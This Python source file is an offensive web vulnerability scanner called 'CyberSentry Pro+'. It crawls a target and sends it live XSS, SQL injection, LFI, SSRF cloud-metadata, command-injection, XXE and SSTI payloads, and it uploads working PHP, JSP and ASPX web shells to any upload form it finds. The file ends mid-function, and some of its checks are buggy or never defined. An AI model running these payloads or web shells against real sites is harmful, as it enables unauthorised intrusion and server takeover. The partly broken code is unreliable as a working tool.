#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# WEBSITE VULNERABILITY SCANNER: "CyberSentry Pro+"
# EDUCATIONAL PURPOSES ONLY - UNAUTHORIZED USE PROHIBITED
# Author: 0x7a6 (Rebel Genius Collective)

import requests
from bs4 import BeautifulSoup
import urllib.parse
import re
import socket
import ssl
import json
import concurrent.futures
import time
import argparse
import base64
import hashlib
import random
import string
import os
import xml.etree.ElementTree as ET
from urllib.parse import urlparse, urljoin
from colorama import Fore, Style, init
import dns.resolver
import logging
import jwt
import brotli
import zlib

# Initialize colorama
init(autoreset=True)

# Configure logging
logging.basicConfig(filename='scanner.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

class VulnerabilityScanner:
    def __init__(self, target_url, threads=20, proxy=None, auth=None, headers=None, cookies=None, timeout=30, verbose=False):
        self.target_url = target_url
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False  # Disable SSL verification (use with caution)
        
        # Setup proxy if provided
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }
        
        # Setup authentication if provided
        if auth:
            self.session.auth = (auth.get('username'), auth.get('password'))
        
        # Setup custom headers
        headers = headers or {}
        headers.update({
            'User-Agent': 'CyberSentryPro+/2.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'X-Scanner': 'CyberSentry Pro+'
        })
        self.session.headers.update(headers)
        
        # Setup cookies
        if cookies:
            self.session.cookies.update(cookies)
        
        self.results = {
            "target": target_url,
            "start_time": time.strftime("%Y-%m-%d %H:%M:%S"),
            "vulnerabilities": [],
            "security_headers": [],
            "server_info": {},
            "cms_tech": [],
            "endpoints": [],
            "subdomains": [],
            "crawl_results": [],
            "api_endpoints": [],
            "sensitive_files": [],
            "dns_records": [],
            "compression_analysis": [],
            "performance_metrics": {}
        }
        self.start_time = time.time()
        self.crawl_visited = set()
        self.crawl_queue = set([target_url])

    def log(self, message, level='info'):
        """Log messages with verbosity control"""
        if self.verbose:
            print(f"{Fore.CYAN}[LOG]{Style.RESET_ALL} {message}")
        if level == 'info':
            logging.info(message)
        elif level == 'warning':
            logging.warning(message)
        elif level == 'error':
            logging.error(message)

    def scan(self):
        """Main scanning function that orchestrates all vulnerability checks"""
        try:
            # Initial request and setup
            response = self.session.get(self.target_url, timeout=self.timeout, allow_redirects=True)
            final_url = response.url
            self.results['final_url'] = final_url
            self.results['status_code'] = response.status_code
            self.results['content_length'] = len(response.content)
            
            # Performance metrics
            self.results['performance_metrics']['initial_response_time'] = response.elapsed.total_seconds()
            
            # Analyze compression
            self.analyze_compression(response)
            
            # Crawl the website
            self.crawl_website()
            
            # DNS reconnaissance
            self.dns_reconnaissance()
            
            # Run all vulnerability checks
            self.log("Starting vulnerability checks...")
            checks = [
                self.check_xss,
                self.check_sqli,
                self.check_open_redirect,
                self.check_lfi,
                self.check_ssrf,
                self.check_command_injection,
                self.check_idor,
                self.check_xxe,
                self.check_ssti,
                self.check_crlf,
                self.check_file_upload,
                self.check_deserialization,
                self.check_jwt_vulnerabilities,
                self.check_cors,
                self.check_csrf,
                self.check_directory_listing,
                self.check_cache_poisoning,
                self.check_http_request_smuggling,
                self.check_rate_limiting,
                self.check_clickjacking,
                self.check_http_methods,
                self.check_websockets,
                self.check_sensitive_data_exposure,
                self.check_logout_functionality,
                self.check_brute_force_protection
            ]
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
                future_to_check = {executor.submit(check): check for check in checks}
                for future in concurrent.futures.as_completed(future_to_check):
                    try:
                        vulnerabilities = future.result()
                        self.results['vulnerabilities'].extend(vulnerabilities)
                    except Exception as e:
                        self.log(f"Check failed: {str(e)}", 'error')
            
            # Security headers check
            self.results['security_headers'] = self.check_security_headers(response.headers)
            
            # Server info and tech detection
            self.results['server_info'] = self.get_server_info(final_url)
            self.results['cms_tech'] = self.detect_tech(response.text, response.headers)
            
            # Additional checks
            self.find_subdomains()
            self.check_sensitive_files()
            self.find_api_endpoints()
            self.check_api_security()
            
        except Exception as e:
            error_msg = f"Scan failed: {str(e)}"
            self.results['error'] = error_msg
            self.log(error_msg, 'error')
        
        self.results['end_time'] = time.strftime("%Y-%m-%d %H:%M:%S")
        self.results['scan_duration'] = time.time() - self.start_time
        return self.results

    def analyze_compression(self, response):
        """Analyze server compression support and efficiency"""
        compression = {}
        content_encoding = response.headers.get('Content-Encoding', '').lower()
        original_size = len(response.content)
        
        # Check supported compression methods
        accept_encoding = self.session.headers.get('Accept-Encoding', '')
        compression['supported_methods'] = accept_encoding.split(',') if accept_encoding else []
        
        # Calculate compression ratio
        if content_encoding:
            try:
                decompressed_size = len(self.decompress(response.content, content_encoding))
                ratio = (original_size - decompressed_size) / decompressed_size * 100
                compression['ratio'] = f"{ratio:.2f}%"
            except:
                compression['ratio'] = "Unknown"
        
        # Check for compression-related vulnerabilities
        vulnerabilities = []
        if 'br' in content_encoding:
            try:
                brotli.decompress(response.content)
            except:
                vulnerabilities.append({
                    "type": "Brotli Compression Bomb",
                    "severity": "High",
                    "confidence": "Medium"
                })
        
        self.results['compression_analysis'] = compression
        if vulnerabilities:
            self.results['vulnerabilities'].extend(vulnerabilities)

    def decompress(self, content, encoding):
        """Decompress content based on encoding"""
        if encoding == 'gzip':
            return zlib.decompress(content, 16 + zlib.MAX_WBITS)
        elif encoding == 'deflate':
            return zlib.decompress(content)
        elif encoding == 'br':
            return brotli.decompress(content)
        return content

    def crawl_website(self):
        """Crawl the website to find all accessible endpoints"""
        try:
            self.log("Starting website crawl...")
            while self.crawl_queue:
                current_url = self.crawl_queue.pop()
                if current_url in self.crawl_visited:
                    continue
                
                self.crawl_visited.add(current_url)
                
                try:
                    response = self.session.get(current_url, timeout=self.timeout)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Add current URL to endpoints
                    if current_url not in self.results['endpoints']:
                        self.results['endpoints'].append(current_url)
                    
                    # Find all links
                    for link in soup.find_all('a', href=True):
                        href = link.get('href')
                        if href and not href.startswith(('javascript:', 'mailto:', 'tel:')):
                            full_url = urljoin(current_url, href)
                            parsed_url = urlparse(full_url)
                            if parsed_url.netloc == urlparse(self.target_url).netloc:
                                if full_url not in self.crawl_visited and full_url not in self.crawl_queue:
                                    self.crawl_queue.add(full_url)
                    
                    # Find all forms
                    for form in soup.find_all('form'):
                        action = form.get('action')
                        if action:
                            full_url = urljoin(current_url, action)
                            if full_url not in self.results['endpoints']:
                                self.results['endpoints'].append(full_url)
                    
                    # Find all scripts and CSS
                    for resource in soup.find_all(['script', 'link']):
                        src = resource.get('src') or resource.get('href')
                        if src:
                            full_url = urljoin(current_url, src)
                            if full_url not in self.results['endpoints']:
                                self.results['endpoints'].append(full_url)
                
                except Exception as e:
                    self.log(f"Error crawling {current_url}: {str(e)}", 'error')
            
            # Find API endpoints from JavaScript files
            js_files = [url for url in self.results['endpoints'] if url.endswith('.js')]
            self.log(f"Found {len(js_files)} JavaScript files to analyze for API endpoints")
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
                future_to_url = {executor.submit(self.find_api_in_js, url): url for url in js_files}
                for future in concurrent.futures.as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        api_endpoints = future.result()
                        self.results['api_endpoints'].extend(api_endpoints)
                    except Exception as e:
                        self.log(f"Error processing {url}: {str(e)}", 'error')
            
            self.log(f"Crawling completed. Found {len(self.results['endpoints'])} endpoints")
        
        except Exception as e:
            self.log(f"Crawling failed: {str(e)}", 'error')
            self.results['crawl_error'] = str(e)

    def dns_reconnaissance(self):
        """Perform DNS reconnaissance on the target domain"""
        self.log("Starting DNS reconnaissance...")
        domain = urlparse(self.target_url).netloc
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(domain, record_type)
                for rdata in answers:
                    self.results['dns_records'].append({
                        "type": record_type,
                        "value": str(rdata)
                    })
            except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
                continue
            except Exception as e:
                self.log(f"DNS query for {record_type} failed: {str(e)}", 'warning')
        
        # Fixed syntax error
        count = len(self.results['dns_records'])
        self.log(f"Found {count} DNS records")

    def check_xss(self, response=None):
        """Detect potential XSS vulnerabilities with advanced payloads"""
        if response is None:
            response = self.session.get(self.target_url)
        
        vulnerabilities = []
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Advanced XSS payloads
        payloads = [
            "<svg/onload=alert(1)>",
            "'\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "`\"'><script>alert(1)</script>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "{{constructor.constructor('alert(1)')()}}",
            "<math><maction actiontype=statusline target=window status=alert(1)></maction>"
        ]
        
        # Check URL parameters
        parsed = urllib.parse.urlparse(self.target_url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        for param in query_params:
            for payload in payloads:
                test_url = self.target_url.replace(param + "=" + query_params[param][0], 
                                                 param + "=" + urllib.parse.quote(payload))
                try:
                    test_response = self.session.get(test_url)
                    if payload in test_response.text:
                        vulnerabilities.append({
                            "type": "Reflected XSS",
                            "parameter": param,
                            "severity": "High",
                            "payload": payload,
                            "confidence": "High"
                        })
                        break
                except:
                    continue
        
        # Check forms
        forms = soup.find_all('form')
        for form in forms:
            form_action = form.get('action')
            if not form_action:
                continue
                
            full_url = urljoin(self.target_url, form_action)
            inputs = form.find_all('input')
            form_data = {}
            for inp in inputs:
                name = inp.get('name')
                if name:
                    form_data[name] = payloads[0]  # Use first payload
            
            if form.get('method', '').lower() == 'post':
                test_response = self.session.post(full_url, data=form_data)
            else:
                test_response = self.session.get(full_url, params=form_data)
                
            if payloads[0] in test_response.text:
                vulnerabilities.append({
                    "type": "Stored/Persistent XSS",
                    "form_action": full_url,
                    "severity": "Critical",
                    "confidence": "Medium"
                })
        
        # DOM-based XSS detection
        if any("document.write" in response.text for payload in payloads):
            vulnerabilities.append({
                "type": "Potential DOM-based XSS",
                "severity": "High",
                "confidence": "Low"
            })
        
        return vulnerabilities

    def check_sqli(self):
        """Detect SQL injection vulnerabilities with advanced techniques"""
        vulnerabilities = []
        payloads = [
            "' OR 1=1--",
            "' OR SLEEP(5)--",
            "' UNION SELECT NULL, user(), version()--",
            "' AND 1=IF(2>1,SLEEP(5),0)--",
            "1' ORDER BY 10--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
        ]
        
        # Blind SQLi payloads
        blind_payloads = {
            "time_based": "' OR IF(1=1,SLEEP(5),0--",
            "boolean_based": "' OR 1=1 AND 'a'='a"
        }
        
        parsed = urllib.parse.urlparse(self.target_url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        for param in query_params:
            # Standard payloads
            for payload in payloads:
                test_url = self.target_url.replace(param + "=" + query_params[param][0], 
                                                 param + "=" + urllib.parse.quote(payload))
                try:
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=15)
                    response_time = time.time() - start_time
                    
                    # Error-based detection
                    error_keywords = ["SQL syntax", "mysql_fetch", "syntax error", "unexpected end", "ORA-", "SQLite3", "PostgreSQL"]
                    if any(keyword in response.text.lower() for keyword in error_keywords):
                        vulnerabilities.append({
                            "type": "SQL Injection (Error-based)",
                            "parameter": param,
                            "severity": "Critical",
                            "payload": payload,
                            "confidence": "High"
                        })
                        break
                    
                    # Time-based detection
                    elif "SLEEP" in payload and response_time > 5:
                        vulnerabilities.append({
                            "type": "SQL Injection (Time-based)",
                            "parameter": param,
                            "severity": "Critical",
                            "payload": payload,
                            "confidence": "Medium"
                        })
                        break
                    
                    # Boolean-based detection
                    elif "1=1" in payload and response.status_code == 200:
                        false_url = self.target_url.replace(param + "=" + query_params[param][0], 
                                                          param + "=" + urllib.parse.quote("' AND 1=0--"))
                        false_response = self.session.get(false_url)
                        if response.text != false_response.text:
                            vulnerabilities.append({
                                "type": "SQL Injection (Boolean-based)",
                                "parameter": param,
                                "severity": "Critical",
                                "payload": payload,
                                "confidence": "Medium"
                            })
                            break
                    
                except:
                    continue
            
            # Blind SQLi detection
            for blind_type, payload in blind_payloads.items():
                test_url = self.target_url.replace(param + "=" + query_params[param][0], 
                                                 param + "=" + urllib.parse.quote(payload))
                try:
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=15)
                    response_time = time.time() - start_time
                    
                    if blind_type == "time_based" and response_time > 5:
                        vulnerabilities.append({
                            "type": "Blind SQL Injection (Time-based)",
                            "parameter": param,
                            "severity": "Critical",
                            "payload": payload,
                            "confidence": "Medium"
                        })
                        break
                    
                    if blind_type == "boolean_based":
                        false_url = self.target_url.replace(param + "=" + query_params[param][0], 
                                                          param + "=" + urllib.parse.quote("' OR 1=0 AND 'a'='a"))
                        false_response = self.session.get(false_url)
                        if response.text != false_response.text:
                            vulnerabilities.append({
                                "type": "Blind SQL Injection (Boolean-based)",
                                "parameter": param,
                                "severity": "Critical",
                                "payload": payload,
                                "confidence": "Medium"
                            })
                            break
                    
                except:
                    continue
        
        return vulnerabilities

    def check_open_redirect(self):
        """Detect open redirect vulnerabilities with advanced techniques"""
        vulnerabilities = []
        redirect_params = ['url', 'next', 'redirect', 'r', 'return', 'to', 'dest', 'destination']
        payloads = [
            'https://evil.com',
            '//evil.com',
            '/\\evil.com',
            'http://google.com@evil.com'
        ]
        
        parsed = urllib.parse.urlparse(self.target_url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        for param in redirect_params:
            if param in query_params:
                for payload in payloads:
                    test_url = self.target_url.replace(param + "=" + query_params[param][0], 
                                                     param + "=" + urllib.parse.quote(payload))
                    response = self.session.get(test_url, allow_redirects=False)
                    if 300 <= response.status_code < 400:
                        location = response.headers.get('Location', '')
                        if payload in location or 'evil.com' in location:
                            vulnerabilities.append({
                                "type": "Open Redirect",
                                "parameter": param,
                                "severity": "Medium",
                                "payload": payload,
                                "confidence": "High"
                            })
                            break
        
        return vulnerabilities

    def check_lfi(self):
        """Detect Local File Inclusion vulnerabilities with null byte bypass"""
        vulnerabilities = []
        payloads = [
            '../../../../etc/passwd%00',
            '../../../../etc/passwd',
            '....//....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
            'C:\\Windows\\System32\\drivers\\etc\\hosts'
        ]
        
        parsed = urllib.parse.urlparse(self.target_url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        for param in query_params:
            for payload in payloads:
                test_url = self.target_url.replace(param + "=" + query_params[param][0], 
                                                 param + "=" + payload)
                response = self.session.get(test_url)
                if "root:" in response.text or "localhost" in response.text or "Microsoft Corp" in response.text:
                    vulnerabilities.append({
                        "type": "Local File Inclusion (LFI)",
                        "parameter": param,
                        "severity": "High",
                        "payload": payload,
                        "confidence": "High"
                    })
                    break
        
        return vulnerabilities

    def check_ssrf(self):
        """Detect Server-Side Request Forgery vulnerabilities with AWS/GCP metadata"""
        vulnerabilities = []
        payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "file:///etc/passwd",
            "http://localhost:8080/admin"
        ]
        
        parsed = urllib.parse.urlparse(self.target_url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        for param in query_params:
            for payload in payloads:
                test_url = self.target_url.replace(param + "=" + query_params[param][0], 
                                                 param + "=" + urllib.parse.quote(payload))
                try:
                    response = self.session.get(test_url, timeout=10)
                    if "AMI ID" in response.text or "instance-id" in response.text or "root:" in response.text:
                        vulnerabilities.append({
                            "type": "Server-Side Request Forgery (SSRF)",
                            "parameter": param,
                            "severity": "Critical",
                            "payload": payload,
                            "confidence": "High"
                        })
                        break
                except:
                    continue
        
        return vulnerabilities

    def check_command_injection(self):
        """Detect OS command injection vulnerabilities"""
        vulnerabilities = []
        payloads = [
            ';id',
            '|id',
            '&&id',
            '||id',
            '`id`',
            '$(id)',
            ';sleep 5',
            '|sleep 5',
            '&&sleep 5'
        ]
        
        parsed = urllib.parse.urlparse(self.target_url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        for param in query_params:
            for payload in payloads:
                test_url = self.target_url.replace(param + "=" + query_params[param][0], 
                                                 param + "=" + urllib.parse.quote(payload))
                try:
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=15)
                    response_time = time.time() - start_time
                    
                    # Time-based detection
                    if 'sleep' in payload and response_time > 4:
                        vulnerabilities.append({
                            "type": "Command Injection (Time-based)",
                            "parameter": param,
                            "severity": "Critical",
                            "payload": payload,
                            "confidence": "Medium"
                        })
                        break
                    
                    # Output-based detection
                    elif 'uid=' in response.text:
                        vulnerabilities.append({
                            "type": "Command Injection (Output-based)",
                            "parameter": param,
                            "severity": "Critical",
                            "payload": payload,
                            "confidence": "High"
                        })
                        break
                    
                except:
                    continue
        
        return vulnerabilities

    def check_idor(self):
        """Detect Insecure Direct Object References"""
        vulnerabilities = []
        # Placeholder for IDOR detection
        return vulnerabilities

    def check_jwt_vulnerabilities(self):
        """Detect JWT implementation vulnerabilities"""
        vulnerabilities = []
        jwt_tokens = []
        
        # Find JWT tokens in cookies and local storage
        for cookie in self.session.cookies:
            if cookie.name.lower().startswith('jwt') or cookie.name.lower().endswith('_jwt'):
                jwt_tokens.append(cookie.value)
        
        # Check for JWT in Authorization headers
        auth_header = self.session.headers.get('Authorization', '')
        if auth_header.startswith('Bearer '):
            jwt_tokens.append(auth_header[7:])
        
        for token in jwt_tokens:
            try:
                # Decode without verification
                decoded = jwt.decode(token, options={"verify_signature": False})
                
                # Check for "none" algorithm vulnerability
                header = jwt.get_unverified_header(token)
                if header.get('alg') == 'none':
                    vulnerabilities.append({
                        "type": "JWT Algorithm None",
                        "severity": "Critical",
                        "token": token[:20] + "...",
                        "confidence": "High"
                    })
                
                # Check for weak secrets
                weak_secrets = ['secret', 'password', '123456', 'qwerty', 'admin']
                for secret in weak_secrets:
                    try:
                        jwt.decode(token, secret, algorithms=["HS256"])
                        vulnerabilities.append({
                            "type": "JWT Weak Secret",
                            "severity": "High",
                            "secret": secret,
                            "confidence": "Medium"
                        })
                        break
                    except:
                        continue
                
                # Check for expired tokens
                if 'exp' in decoded and decoded['exp'] < time.time():
                    vulnerabilities.append({
                        "type": "JWT Expired",
                        "severity": "Medium",
                        "confidence": "High"
                    })
                
            except Exception as e:
                self.log(f"JWT check failed: {str(e)}", 'warning')
        
        return vulnerabilities

    def check_xxe(self):
        """Detect XML External Entity (XXE) vulnerabilities"""
        vulnerabilities = []
        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <root>&xxe;</root>"""
        
        # Check if any endpoints accept XML
        for endpoint in self.results['endpoints']:
            if 'xml' in endpoint or 'soap' in endpoint:
                try:
                    headers = {'Content-Type': 'application/xml'}
                    response = self.session.post(endpoint, data=xxe_payload, headers=headers)
                    if "root:" in response.text:
                        vulnerabilities.append({
                            "type": "XML External Entity (XXE)",
                            "endpoint": endpoint,
                            "severity": "Critical",
                            "confidence": "High"
                        })
                except:
                    continue
        
        return vulnerabilities

    def check_ssti(self):
        """Detect Server-Side Template Injection (SSTI) vulnerabilities"""
        vulnerabilities = []
        ssti_payloads = {
            "jinja2": "{{ 7 * 7 }}",
            "twig": "{{ 7 * 7 }}",
            "django": "{% debug %}",
            "freemarker": "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }",
            "velocity": "#set($str=$class.inspect(\"java.lang.String\").type) #set($chr=$class.inspect(\"java.lang.Character\").type) #set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\")) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"
        }
        
        parsed = urllib.parse.urlparse(self.target_url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        for param in query_params:
            for engine, payload in ssti_payloads.items():
                test_url = self.target_url.replace(param + "=" + query_params[param][0], 
                                                 param + "=" + urllib.parse.quote(payload))
                try:
                    response = self.session.get(test_url)
                    if ("49" in response.text and "jinja" in engine) or \
                       ("debug" in response.text and "django" in engine) or \
                       ("uid=" in response.text and "freemarker" in engine):
                        vulnerabilities.append({
                            "type": f"Server-Side Template Injection ({engine.upper()})",
                            "parameter": param,
                            "severity": "Critical",
                            "payload": payload,
                            "confidence": "Medium"
                        })
                        break
                except:
                    continue
        
        return vulnerabilities

    def check_crlf(self):
        """Detect CRLF Injection vulnerabilities"""
        vulnerabilities = []
        crlf_payloads = [
            "%0d%0aSet-Cookie:injected=crlf",
            "%0d%0aX-Injected: header"
        ]
        
        parsed = urllib.parse.urlparse(self.target_url)
        query_params = urllib.parse.parse_qs(parsed.query)
        
        for param in query_params:
            for payload in crlf_payloads:
                test_url = self.target_url.replace(param + "=" + query_params[param][0], 
                                                 param + "=" + urllib.parse.quote(payload))
                try:
                    response = self.session.get(test_url)
                    if "Set-Cookie: injected=crlf" in str(response.headers) or \
                       "X-Injected: header" in str(response.headers):
                        vulnerabilities.append({
                            "type": "CRLF Injection",
                            "parameter": param,
                            "severity": "Medium",
                            "payload": payload,
                            "confidence": "High"
                        })
                        break
                except:
                    continue
        
        return vulnerabilities

    def check_file_upload(self):
        """Detect insecure file upload vulnerabilities"""
        vulnerabilities = []
        malicious_files = {
            "php_shell.php": "<?php system($_GET['cmd']); ?>",
            "jsp_shell.jsp": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
            "aspx_shell.aspx": "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process.Start(Request[\"cmd\"]); %>"
        }
        
        # Find file upload forms
        for endpoint in self.results['endpoints']:
            try:
                response = self.session.get(endpoint)
                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')
                
                for form in forms:
                    if form.find('input', {'type': 'file'}):
                        form_action = form.get('action') or endpoint
                        full_url = urljoin(self.target_url, form_action)
                        
                        # Try uploading malicious files
                        for filename, content in malicious_files.items():
                            files = {'file': (filename, content)}
                            try:
                                upload_response = self.session.post(full_url, files=files)
                                if upload_response.status_code == 200 and filename in upload_response.text:
                                    vulnerabilities.append({
                                        "type": "Insecure File Upload",
                                        "endpoint": full_url,
                                        "severity": "Critical",
                                        "filename": filename,
                                        "confidence": "High"
                                    })
                                    break
                            except:
                                continue
            except:
                continue
        
        return vulnerabilities

    def check_deserialization(self):
        """Detect insecure deserialization vulnerabilities"""
        vulnerabilities = []
        # Java serialized object (base64 encoded)
        java_payload = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeA=="
        
        # PHP serialized object
        php_payload = "O:8:\"stdClass\":1:{s:3:\"cmd\";s:10:\"uname -a\";}"
        
        # Check for common deserialization endpoints
        endpoints_to_check = [
            "/api/deserialize",
            "/rest/object",
            "/serialized",
            "/java/deserialize",
            "/php/unserialize"
        ]
        
        for endpoint in endpoints_to_check:
            full_url = urljoin(self.target_url, endpoint)
            try:
                # Java deserialization
                headers = {'Content-Type': 'application/java-serialized-object'}
                response = self.session.post(full_url, data=base64.b64decode(java_payload), headers=headers)
                if "Linux" in response.text:
                    vulnerabilities.append({
                        "type": "Insecure Deserialization (Java)",
                        "endpoint": full_url,
                        "severity": "Critical",
                        "confidence": "Medium"
                    })
                
                # PHP deserialization
                headers = {'Content-Type': 'application/x-www-form-urlencoded'}
                response = self.session.post(full_url, data={"data": php_payload}, headers=headers)
                if "Linux" in response.text:
                    vulnerabilities.append({
                        "type": "Insecure Deserialization (PHP)",
                        "endpoint": full_url,
                        "severity": "Critical",
                        "confidence": "Medium"
                    })
            except:
                continue
        
        return vulnerabilities

    def check_security_headers(self, headers):
        """Check for missing security headers with recommendations"""
        security_headers = {
            "Content-Security-Policy": {
                "status": "MISSING",
                "severity": "High",
                "recommendation": "Implement CSP to prevent XSS attacks"
            },
            "X-Content-Type-Options": {
                "status": "MISSING",
                "severity": "Medium",
                "recommendation": "Set to 'nosniff' to prevent MIME sniffing"
            },
            "Strict-Transport-Security": {
                "status": "MISSING",
                "severity": "High",
                "recommendation": "Enforce HTTPS with max-age=31536000; includeSubDomains"
            },
            "X-Frame-Options": {
                "status": "MISSING",
                "severity": "Medium",
                "recommendation": "Set to 'DENY' or 'SAMEORIGIN' to prevent clickjacking"
            },
            "Referrer-Policy": {
                "status": "MISSING",
                "severity": "Low",
                "recommendation": "Set to 'no-referrer' or 'same-origin'"
            },
            "Permissions-Policy": {
                "status": "MISSING",
                "severity": "Medium",
                "recommendation": "Control browser features and APIs"
            },
            "X-XSS-Protection": {
                "status": "MISSING",
                "severity": "Low",
                "recommendation": "Set to '1; mode=block' (deprecated but still useful)"
            }
        }
        
        for header in security_headers:
            if header in headers:
                security_headers[header]["status"] = "PRESENT"
                security_headers[header]["value"] = headers[header]
        
        return security_headers

    def get_server_info(self, target_url):
        """Retrieve server and SSL information with TLS version detection"""
        info = {}
        parsed = urlparse(target_url)
        host = parsed.netloc.split(':')[0]
        
        try:
            # Get server headers
            response = self.session.head(target_url)
            info['server'] = response.headers.get('Server', 'Unknown')
            info['x-powered-by'] = response.headers.get('X-Powered-By', '')
            
            # SSL/TLS information
            context = ssl.create_default_context()
            with socket.create_connection((host, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    info['ssl_version'] = ssock.version()
                    info['cipher'] = ssock.cipher()
                    cert = ssock.getpeercert()
                    info['cert_issuer'] = dict(x[0] for x in cert['issuer'])
                    info['cert_subject'] = dict(x[0] for x in cert['subject'])
                    info['cert_expiry'] = cert['notAfter']
                    
                    # Check TLS version
                    if "TLSv1.3" in ssock.version():
                        info['tls_status'] = "Secure"
                    elif "TLSv1.2" in ssock.version():
                        info['tls_status'] = "Secure"
                    else:
                        info['tls_status'] = "Insecure"
        except Exception as e:
            info['error'] = str(e)
        
        return info

    def detect_tech(self, html, headers):
        """Detect CMS, frameworks, and technologies with enhanced signatures"""
        tech = []
        
        # CMS detection
        cms_signatures = {
            "WordPress": ["wp-content", "wp-includes", "wp-json", "wordpress"],
            "Joomla": ["joomla-script-", "media/jui/", "joomla", "Joomla!"],
            "Drupal": ["sites/all/", "Drupal.settings", "drupal", "Drupal"],
            "Magento": ["magento/version", "Mage.Cookies", "magento"],
            "Shopify": ["shopify", "cdn.shopify.com"],
            "Laravel": ["laravel", "/vendor/laravel", "csrf-token"],
            "React": ["react-dom", "__react_root", "react-app"],
            "Vue.js": ["vue.js", "__vue__", "vue-router"]
        }
        
        for cms, signatures in cms_signatures.items():
            if any(sig in html for sig in signatures):
                tech.append({"name": cms, "type": "CMS/Framework", "confidence": "High"})
        
        # Server tech detection
        server = headers.get('Server', '').lower()
        if 'apache' in server:
            tech.append({"name": "Apache", "type": "Web Server", "confidence": "High"})
        elif 'nginx' in server:
            tech.append({"name": "Nginx", "type": "Web Server", "confidence": "High"})
        elif 'iis' in server:
            tech.append({"name": "IIS", "type": "Web Server", "confidence": "High"})
        elif 'cloudflare' in server:
            tech.append({"name": "Cloudflare", "type": "CDN/WAF", "confidence": "High"})
        
        # Programming languages
        if 'php' in server or '.php' in html:
            tech.append({"name": "PHP", "type": "Programming Language", "confidence": "High"})
        if 'x-powered-by' in headers and 'asp.net' in headers['X-Powered-By'].lower():
            tech.append({"name": "ASP.NET", "type": "Framework", "confidence": "High"})
        if 'node' in headers.get('X-Powered-By', '').lower():
            tech.append({"name": "Node.js", "type": "Runtime", "confidence": "Medium"})
        if 'python' in headers.get('Server', '').lower() or 'django' in html.lower():
            tech.append({"name": "Python", "type": "Programming Language", "confidence": "Medium"})
        
        # JavaScript frameworks
        if 'jquery' in html:
            tech.append({"name": "jQuery", "type": "JavaScript Library", "confidence": "High"})
        if 'bootstrap' in html:
            tech.append({"name": "Bootstrap", "type": "CSS Framework", "confidence": "High"})
        
        return tech

    def check_cors(self, response=None):
        """Check for misconfigured CORS policies with credentials"""
        if response is None:
            response = self.session.get(self.target_url)
        
        vulnerabilities = []
        origin = "https://evil.com"
        
        headers = {
            "Origin": origin,
            "Access-Control-Request-Method": "GET",
            "Access-Control-Request-Headers": "X-Requested-With"
        }
        
        cors_response = self.session.get(self.target_url, headers=headers)
        acao = cors_response.headers.get('Access-Control-Allow-Origin', '')
        acac = cors_response.headers.get('Access-Control-Allow-Credentials', '')
        
        if acao == '*' and acac == 'true':
            vulnerabilities.append({
                "type": "Misconfigured CORS",
                "severity": "High",
                "exploit": "Steal user data using malicious JavaScript",
                "confidence": "High"
            })
        elif origin in acao and acac == 'true':
            vulnerabilities.append({
                "type": "Misconfigured CORS",
                "severity": "Critical",
                "exploit": "Steal authenticated user data with credentials",
                "confidence": "High"
            })
        
        return vulnerabilities

    def check_csrf(self, response=None):
        """Check for missing CSRF protections with token analysis"""
        if response is None:
            response = self.session.get(self.target_url)
        
        vulnerabilities = []
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            csrf_tokens = form.find_all('input', {'name': ['csrf_token', 'csrfmiddlewaretoken', 'authenticity_token']})
            if not csrf_tokens:
                vulnerabilities.append({
                    "type": "Potential CSRF Vulnerability",
                    "element": str(form)[:100] + "...",
                    "severity": "Medium",
                    "exploit": "Create malicious form to submit actions",
                    "confidence": "Medium"
                })
            else:
                # Check if token is predictable
                token = csrf_tokens[0].get('value', '')
                if len(token) < 16 or token.isnumeric():
                    vulnerabilities.append({
